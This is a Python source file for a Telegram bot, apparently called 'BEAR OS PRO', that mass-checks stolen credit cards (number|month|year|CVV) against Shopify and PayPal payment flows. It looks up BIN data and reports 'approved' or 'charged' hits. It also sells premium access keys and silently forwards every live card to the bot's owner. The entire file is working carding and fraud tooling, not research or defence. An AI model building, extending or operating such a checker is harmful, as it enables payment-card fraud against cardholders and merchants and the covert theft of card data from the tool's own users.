import asyncio
import os
import secrets
import string
import json
import time
import re
import logging
import aiohttp
from datetime import datetime, timedelta

from aiogram import Bot, Dispatcher, Router, F
from aiogram.types import Message
from aiogram.filters import Command, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties

# --- BACKEND IMPORTS ---
# Ensure api.py and paypal.py are in the same directory
from api import process_card_async, parse_cc_string, extract_clean_response
from paypal import check_paypal_cc 

# --- LOGGING ---
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# --- ENV VARIABLES & ROLE SYSTEM ---
BOT_TOKEN = os.getenv("BOT_TOKEN")

# Safely parse OWNER and ADMIN IDs
OWNER_ID = str(os.getenv("OWNER_ID", "")).strip()
_admin_env = str(os.getenv("ADMIN_IDS", os.getenv("ADMIN_ID", "")))
ADMIN_IDS = [x.strip() for x in _admin_env.split(",") if x.strip()]

# Ensure OWNER is always in ADMIN_IDS
if OWNER_ID and OWNER_ID not in ADMIN_IDS:
    ADMIN_IDS.append(OWNER_ID)

# Fallback if OWNER_ID isn't explicitly set but ADMIN_ID is
if not OWNER_ID and ADMIN_IDS:
    OWNER_ID = ADMIN_IDS[0]

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()
dp.include_router(router)

PREMIUM_FILE = "premium.json"
KEYS_FILE = "keys.json"
USERS_FILE = "users.json"

# --- DATABASE LOGIC ---
def load_db(filename):
    if os.path.exists(filename):
        try:
            with open(filename, "r") as f: return json.load(f)
        except: return {}
    return {}

def save_db(filename, data):
    with open(filename, "w") as f: json.dump(data, f, indent=4)

def is_admin(user_id: str) -> bool:
    return str(user_id) in ADMIN_IDS

def check_tier(user_id):
    if is_admin(user_id): return "👑 ADMIN"
    db = load_db(PREMIUM_FILE)
    if str(user_id) in db:
        expiry = datetime.fromisoformat(db[str(user_id)])
        if datetime.now() < expiry: return "💎 PREMIUM"
    return "🆓 FREE"

def add_user(user_id):
    users = load_db(USERS_FILE)
    if str(user_id) not in users:
        users[str(user_id)] = datetime.now().isoformat()
        save_db(USERS_FILE, users)

async def get_bin_info(session, cc):
    try:
        bin6 = cc[:6]
        async with session.get(f"https://bins.antipublic.cc/bins/{bin6}", timeout=5) as res:
            if res.status == 200:
                data = await res.json()
                return (
                    data.get('brand', 'Unknown'),
                    data.get('bank', 'Unknown'),
                    data.get('country_name', 'Unknown'),
                    data.get('country_flag', ''),
                    data.get('type', 'Unknown')
                )
    except: pass
    return "Unknown", "Unknown", "Unknown", "", "Unknown"

# --- FSM STATES ---
class AppStates(StatesGroup):
    waiting_shopify_single = State()
    waiting_shopify_mass = State()
    waiting_shopify_mass_file = State()
    
    waiting_paypal_single = State()
    waiting_paypal_mass = State()
    waiting_paypal_mass_file = State()

# --- RESULT UI FORMATTER ---
def format_result(status, checker, result, cc, country, flag, bank, brand, c_type, total, app, dec, err, start_time, tier, username):
    elapsed = time.time() - start_time
    speed = total / elapsed if elapsed > 0 else 0
    hit_rate = round((app / total * 100), 2) if total > 0 else 0
    
    icon = "✅" if status in ["APPROVED", "CHARGED", "LIVE"] else "❌" if status == "DECLINED" else "⚠️"
    
    return f"""<code>━━━━━━━━━━━━━━━━━━━━
{icon} {checker} — {result}
━━━━━━━━━━━━━━━━━━━━

💳 Card       : {cc}
📍 Country    : {country} {flag}
🏦 Bank       : {bank}
💠 Brand      : {brand}
💳 Type       : {c_type}

📦 Total      : {total}
✅ Approved   : {app}
❌ Declined   : {dec}
⚠️ Errors     : {err}

📈 Hit Rate   : {hit_rate}%
⚡ Speed      : {speed:.2f} cards/s
⏱ Time       : {elapsed:.1f}s

🔑 Tier       : {tier}

━━━━━━━━━━━━━━━━━━━━
👤 User       : @{username}
━━━━━━━━━━━━━━━━━━━━</code>"""

# --- CORE COMMANDS ---
@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    uid = str(message.from_user.id)
    add_user(uid)
    logging.info(f"User {uid} triggered /start")
    
    menu_text = (
        "<code>👋 Welcome to the Checker Bot\n\n"
        "📌 Available Commands:\n\n"
        "💳 Checkers:\n"
        "• /paypal_mass_file → Mass PayPal (.txt file)\n"
        "• /paypal_mass → Mass PayPal (Text)\n"
        "• /paypal_single → Single PayPal check\n"
        "• /shopify_mass_file → Mass Shopify (.txt file)\n"
        "• /shopify_mass → Mass Shopify (Text)\n"
        "• /shopify_single → Single Shopify check\n\n"
        "🔑 Keys:\n"
        "• /redeem → Redeem a key\n\n"
        "⚙️ Other:\n"
        "• /status → View your plan/status\n"
    )
    
    if is_admin(uid):
        menu_text += (
            "\n👑 Admin Commands:\n"
            "• /genkey <qty> <days> → Generate keys\n"
            "• /broadcast <msg> → Message all users\n"
            "• /users → Show bot statistics\n"
        )
        
    menu_text += "━━━━━━━━━━━━━━━━━━━━</code>"
    await message.answer(menu_text)

@router.message(Command("status"))
async def cmd_status(message: Message, state: FSMContext):
    await state.clear()
    uid = str(message.from_user.id)
    tier = check_tier(uid)
    db = load_db(PREMIUM_FILE)
    
    if tier == "👑 ADMIN":
        expiry_text = "Lifetime"
    elif tier == "💎 PREMIUM":
        exp = datetime.fromisoformat(db[uid])
        expiry_text = exp.strftime('%Y-%m-%d %H:%M:%S')
    else:
        expiry_text = "N/A"
        
    await message.answer(f"👤 <b>Your Status</b>\n━━━━━━━━━━\n🔑 <b>Tier:</b> {tier}\n⏳ <b>Expires:</b> {expiry_text}")

# --- KEY & ADMIN SYSTEM ---
@router.message(Command("genkey"))
async def cmd_genkey(message: Message, command: CommandObject, state: FSMContext):
    await state.clear()
    uid = str(message.from_user.id)
    if not is_admin(uid): 
        return await message.answer("❌ Admin only command.")
    
    args = command.args
    if not args:
        return await message.answer("⚠️ Usage: <code>/genkey &lt;count&gt; &lt;duration&gt;</code>\nExample: <code>/genkey 10 7d</code>")
    
    try:
        parts = args.split()
        count = int(parts[0])
        dur_str = parts[1].lower()
        days = int(dur_str.replace('d', '')) if 'd' in dur_str else int(dur_str)
    except:
        return await message.answer("⚠️ Invalid format. Use: <code>/genkey 10 7d</code>")
        
    keys_db = load_db(KEYS_FILE)
    generated = []
    
    for _ in range(count):
        k = "BEAR-" + "".join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(12))
        keys_db[k] = days
        generated.append(f"<code>{k}</code>")
        
    save_db(KEYS_FILE, keys_db)
    res = f"✅ <b>Generated {count} Keys ({days} Days)</b>\n\n" + "\n".join(generated)
    await message.answer(res)

@router.message(Command("redeem"))
async def cmd_redeem(message: Message, command: CommandObject, state: FSMContext):
    await state.clear()
    key = command.args
    if not key:
        return await message.answer("⚠️ Usage: <code>/redeem &lt;key&gt;</code>")
        
    keys_db = load_db(KEYS_FILE)
    if key not in keys_db:
        return await message.answer("❌ Invalid or expired key.")
        
    days = keys_db[key]
    prem_db = load_db(PREMIUM_FILE)
    uid = str(message.from_user.id)
    
    current_expiry = datetime.now()
    if uid in prem_db:
        saved_exp = datetime.fromisoformat(prem_db[uid])
        if saved_exp > current_expiry:
            current_expiry = saved_exp
            
    new_expiry = current_expiry + timedelta(days=days)
    prem_db[uid] = new_expiry.isoformat()
    
    del keys_db[key]
    save_db(PREMIUM_FILE, prem_db)
    save_db(KEYS_FILE, keys_db)
    
    await message.answer(f"✅ <b>Successfully Redeemed!</b>\nAdded {days} days to your subscription.")

@router.message(Command("broadcast"))
async def cmd_broadcast(message: Message, command: CommandObject, state: FSMContext):
    await state.clear()
    if not is_admin(str(message.from_user.id)): return
    if not command.args: return await message.answer("⚠️ Include a message to broadcast.")
    
    users = load_db(USERS_FILE)
    sent = 0
    msg = await message.answer(f"⏳ Broadcasting to {len(users)} users...")
    
    for uid in users:
        try:
            await bot.send_message(uid, f"📢 <b>Announcement</b>\n━━━━━━━━━━\n{command.args}")
            sent += 1
            await asyncio.sleep(0.05)
        except: pass
        
    await msg.edit_text(f"✅ Broadcast complete. Sent to {sent}/{len(users)} users.")

@router.message(Command("users"))
async def cmd_users(message: Message, state: FSMContext):
    await state.clear()
    if not is_admin(str(message.from_user.id)): return
    users = load_db(USERS_FILE)
    prem = load_db(PREMIUM_FILE)
    await message.answer(f"📊 <b>Bot Statistics</b>\n━━━━━━━━━━\n👥 Total Users: {len(users)}\n💎 Premium Users: {len(prem)}")

# --- CHECKER PROCESSOR (CORE ENGINE) ---
async def process_checker(message: Message, ccs: list, checker: str):
    user_id = str(message.from_user.id)
    tier = check_tier(user_id)
    
    if tier == "🆓 FREE" and "mass" in checker.lower():
        return await message.answer("❌ Upgrade to Premium to use Mass Checkers.")
        
    total_cards = len(ccs)
    if total_cards == 0:
        return await message.answer("❌ No valid cards found. Ensure format is CC|MM|YYYY|CVV")
    if total_cards > 1 and "single" in checker.lower():
        return await message.answer("⚠️ You provided multiple cards for a Single Check. Use Mass Check instead.")
        
    msg = await message.answer(f"⏳ <b>Initializing {checker}...</b>\nProcessing {total_cards} cards.")
    
    app, dec, err = 0, 0, 0
    start_time = time.time()
    username = message.from_user.username or message.from_user.first_name
    
    async with aiohttp.ClientSession() as session:
        for idx, cc in enumerate(ccs, 1):
            try:
                parts = parse_cc_string(cc)
                cc_clean, mes, ano, cvv = parts['cc'], parts['mes'], parts['ano'], parts['cvv']
            except ValueError:
                err += 1
                continue
                
            brand, bank, country, flag, c_type = await get_bin_info(session, cc_clean)
            
            try:
                if "Shopify" in checker:
                    success, raw, g_name, p, c = await process_card_async(cc_clean, mes, ano, cvv, "https://shop.spam.com")
                    status = "CHARGED" if success else "DECLINED"
                    resp = extract_clean_response(raw)
                else: 
                    status, raw = await asyncio.to_thread(check_paypal_cc, cc)
                    resp = extract_clean_response(raw)
            except Exception as e:
                status, resp = "ERROR", str(e)[:30]
                
            if status in ["APPROVED", "CHARGED", "LIVE"]: app += 1
            elif status == "DECLINED": dec += 1
            else: err += 1
            
            ui_text = format_result(
                status, checker, resp, cc, country, flag, bank, brand, c_type, 
                total_cards, app, dec, err, start_time, tier, username
            )
            
            # Hit Handling: Notify User AND Owner (Silently)
            if status in ["APPROVED", "CHARGED", "LIVE"]:
                await message.answer(ui_text) 
                if OWNER_ID:
                    try: await bot.send_message(OWNER_ID, f"🔥 <b>NEW HIT ALERT</b>\n{ui_text}")
                    except: pass
            
            # Update Progress (Throttle edits to avoid ban)
            if total_cards == 1 or (idx % 3 == 0) or idx == total_cards:
                header = f"⏳ <b>Checking... ({idx}/{total_cards})</b>\n\n" if idx < total_cards else f"✅ <b>Check Completed!</b>\n\n"
                try: await msg.edit_text(header + ui_text)
                except: pass
                
            await asyncio.sleep(0.5)

# --- COMMAND ENTRY POINTS (CHECKERS) ---
@router.message(Command("shopify_single"))
async def start_shopify_single(message: Message, state: FSMContext):
    await state.set_state(AppStates.waiting_shopify_single)
    await message.answer("🟢 Send the card to check (Text only):")

@router.message(Command("shopify_mass"))
async def start_shopify_mass(message: Message, state: FSMContext):
    await state.set_state(AppStates.waiting_shopify_mass)
    await message.answer("🟢 Send your list of cards (Text format):")

@router.message(Command("shopify_mass_file"))
async def start_shopify_mass_file(message: Message, state: FSMContext):
    await state.set_state(AppStates.waiting_shopify_mass_file)
    await message.answer("🟢 Upload your <b>.txt</b> file containing the cards:")

@router.message(Command("paypal_single"))
async def start_paypal_single(message: Message, state: FSMContext):
    await state.set_state(AppStates.waiting_paypal_single)
    await message.answer("🔵 Send the card to check (Text only):")

@router.message(Command("paypal_mass"))
async def start_paypal_mass(message: Message, state: FSMContext):
    await state.set_state(AppStates.waiting_paypal_mass)
    await message.answer("🔵 Send your list of cards (Text format):")

@router.message(Command("paypal_mass_file"))
async def start_paypal_mass_file(message: Message, state: FSMContext):
    await state.set_state(AppStates.waiting_paypal_mass_file)
    await message.answer("🔵 Upload your <b>.txt</b> file containing the cards:")


# --- FSM HANDLERS (CAPTURING INPUTS) ---

# 1. TEXT Handlers (Single & Mass Text)
@router.message(AppStates.waiting_shopify_single, F.text)
@router.message(AppStates.waiting_shopify_mass, F.text)
@router.message(AppStates.waiting_paypal_single, F.text)
@router.message(AppStates.waiting_paypal_mass, F.text)
async def handle_text_checkers(message: Message, state: FSMContext):
    current_state = await state.get_state()
    await state.clear()
    
    if message.text.startswith('/'): return # Prevent commands catching in FSM
    
    ccs = re.findall(r"\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}", message.text)
    
    if "shopify_single" in current_state: name = "Shopify Single"
    elif "shopify_mass" in current_state: name = "Shopify Mass"
    elif "paypal_single" in current_state: name = "PayPal Single"
    else: name = "PayPal Mass"
    
    await process_checker(message, ccs, name)

# 2. FILE Handlers (Strictly .txt documents)
@router.message(AppStates.waiting_shopify_mass_file, F.document)
@router.message(AppStates.waiting_paypal_mass_file, F.document)
async def handle_file_checkers(message: Message, state: FSMContext):
    current_state = await state.get_state()
    await state.clear()
    
    if not message.document.file_name.endswith('.txt'):
        return await message.answer("❌ Invalid format. Please upload a .txt file.")
        
    msg = await message.answer("⏳ Downloading file...")
    file = await bot.get_file(message.document.file_id)
    downloaded = await bot.download_file(file.file_path)
    text = downloaded.read().decode('utf-8')
    await msg.delete()
    
    ccs = re.findall(r"\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}", text)
    name = "Shopify Mass File" if "shopify" in current_state else "PayPal Mass File"
    
    await process_checker(message, ccs, name)

# 3. Catch-all for wrong inputs during state (e.g. sending text when file expected)
@router.message(AppStates.waiting_shopify_mass_file, F.text)
@router.message(AppStates.waiting_paypal_mass_file, F.text)
async def handle_wrong_file_input(message: Message, state: FSMContext):
    if message.text.startswith('/'): 
        await state.clear()
        return
    await message.answer("❌ You selected a file check. Please upload a <b>.txt</b> file.")

@router.message(AppStates.waiting_shopify_single, F.document)
@router.message(AppStates.waiting_shopify_mass, F.document)
@router.message(AppStates.waiting_paypal_single, F.document)
@router.message(AppStates.waiting_paypal_mass, F.document)
async def handle_wrong_text_input(message: Message):
    await message.answer("❌ You selected a text check. Please paste the cards directly.")

# --- MAIN DEPLOYMENT ---
async def main():
    logging.info("BEAR OS PRO DEPLOYED - ADVANCED COMMAND SYSTEM READY")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
